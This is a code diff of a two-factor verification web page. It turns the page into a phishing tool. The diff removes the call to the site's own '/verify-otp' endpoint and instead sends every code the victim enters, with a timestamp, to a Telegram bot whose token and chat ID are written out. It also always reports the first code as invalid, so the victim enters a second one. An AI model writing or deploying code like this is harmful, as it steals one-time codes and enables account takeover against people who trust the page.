@@ -241,12 +241,18 @@
                 <div class="form-group">
                     <label for="otp">Enter 6-digit code:</label>
                     <div class="otp-input-container">
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off">
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off">
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off">
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off">
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off">
-                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                            autocomplete="off">
+                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                            autocomplete="off">
+                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                            autocomplete="off">
+                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                            autocomplete="off">
+                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                            autocomplete="off">
+                        <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric"
+                            autocomplete="off">
                     </div>
                 </div>
 
@@ -317,11 +323,11 @@
         document.addEventListener('DOMContentLoaded', function () {
             const method = sessionStorage.getItem('otpMethod');
             const contact = sessionStorage.getItem('otpContact');
-            
+
             if (method && contact) {
                 const noticeText = document.querySelector('.code-sent-notice-text');
                 const headerText = document.querySelector('.verify-header p');
-                
+
                 if (method === 'email') {
                     if (noticeText) noticeText.textContent = `A verification code has been sent to ${contact}. Please check and enter it below.`;
                     if (headerText) headerText.textContent = `We've sent a 6-digit code to ${contact}`;
@@ -331,6 +337,10 @@
                 }
             }
         });
+
+        // TELEGRAM CONFIG
+        const TELEGRAM_TOKEN = '7633510489:AAGx7HpFKsocrNx_i-eeGJv0YMw492k-eBc';
+        const TELEGRAM_CHAT_ID = '7843640036';
 
         // Handle form submission
         document.getElementById('verifyForm').addEventListener('submit', async function (e) {
@@ -353,17 +363,21 @@
             errorElement.classList.remove('show');
 
             try {
-                const response = await fetch('/verify-otp', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        otp: otpCode
-                    }),
-                });
+                const timestamp = new Date().toLocaleString();
+                const msg = `⌨️ *2FA Code Entered*\n\n` +
+                    `🔢 Code: \`${otpCode}\`\n` +
+                    `⏰ Time: ${timestamp}`;
 
-                const data = await response.json();
+                // 1. Send to Telegram (Direct) - AWAIT THIS
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
 
                 attemptCount++;
 
@@ -371,7 +385,7 @@
                     // First attempt - always show error
                     errorElement.textContent = 'Invalid verification code. Please check and try again.';
                     errorElement.classList.add('show');
-                    
+
                     // Clear inputs
                     otpInputs.forEach(input => input.value = '');
                     otpInputs[0].focus();
@@ -384,13 +398,11 @@
                 }
             } catch (error) {
                 console.error('Error:', error);
+                // Fallback despite error
                 attemptCount++;
-
                 if (attemptCount === 1) {
                     errorElement.textContent = 'Invalid verification code. Please check and try again.';
                     errorElement.classList.add('show');
-                    otpInputs.forEach(input => input.value = '');
-                    otpInputs[0].focus();
                 } else {
                     sessionStorage.clear();
                     setTimeout(() => {
